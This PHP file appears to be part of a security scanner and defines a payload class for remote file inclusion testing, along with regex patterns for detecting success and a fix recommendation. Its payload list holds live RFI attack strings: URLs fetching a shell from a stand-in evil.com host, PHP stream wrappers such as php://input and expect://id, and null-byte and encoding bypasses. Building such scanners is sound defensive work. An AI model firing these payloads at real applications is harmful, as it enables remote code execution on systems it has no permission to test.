<?php

declare(strict_types=1);

namespace BEAR\Security\Dast\Payload;

use BEAR\Security\VulnerabilityInterface;

/**
 * Remote File Inclusion (RFI) attack payloads
 */
final class RemoteFileInclusionPayload implements PayloadInterface
{
    public function getName(): string
    {
        return 'Remote File Inclusion (RFI)';
    }

    /** @return string[] */
    public function getPayloads(): array
    {
        return [
            // HTTP-based RFI
            'http://evil.com/shell.txt',
            'http://evil.com/shell.txt?',
            'http://evil.com/shell.txt%00',
            'https://evil.com/malicious.php',

            // Protocol wrappers
            'php://input',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
            'expect://id',
            'phar://malicious.phar',

            // FTP-based RFI
            'ftp://evil.com/shell.txt',

            // Null byte injection (older PHP)
            'http://evil.com/shell.txt%00.jpg',
            'http://evil.com/shell.txt%00.png',

            // Double encoding
            'http%3A%2F%2Fevil.com%2Fshell.txt',
            'http%253A%252F%252Fevil.com%252Fshell.txt',

            // Bypass attempts
            'hTtP://evil.com/shell.txt',
            'HTTP://evil.com/shell.txt',
            '//evil.com/shell.txt',
            'ht\tp://evil.com/shell.txt',
        ];
    }

    /** @return string[] */
    public function getSuccessPatterns(): array
    {
        return [
            // PHP code execution indicators
            '/phpinfo\(\)/i',
            '/<title>phpinfo\(\)/i',
            '/PHP Version/i',
            '/PHP Credits/i',

            // Shell output
            '/uid=\d+.*gid=\d+/i',
            '/root:.*:0:0:/i',

            // Error messages indicating file inclusion attempt
            '/failed to open stream/i',
            '/include\(\): Failed opening/i',
            '/require\(\): Failed opening/i',
            '/include_once\(\): Failed opening/i',
            '/require_once\(\): Failed opening/i',
            '/URL file-access is disabled/i',
            '/allow_url_include/i',
            '/allow_url_fopen/i',

            // Wrapper errors
            '/Unable to find the wrapper/i',
            '/wrapper is disabled/i',
        ];
    }

    public function getSeverity(): string
    {
        return VulnerabilityInterface::SEVERITY_CRITICAL;
    }

    public function getDescription(): string
    {
        return 'Remote File Inclusion (RFI) vulnerability detected - remote code can be executed';
    }

    public function getRecommendation(): string
    {
        return 'Never use user input in include/require. Disable allow_url_include in php.ini. Use a whitelist of allowed files.';
    }
}
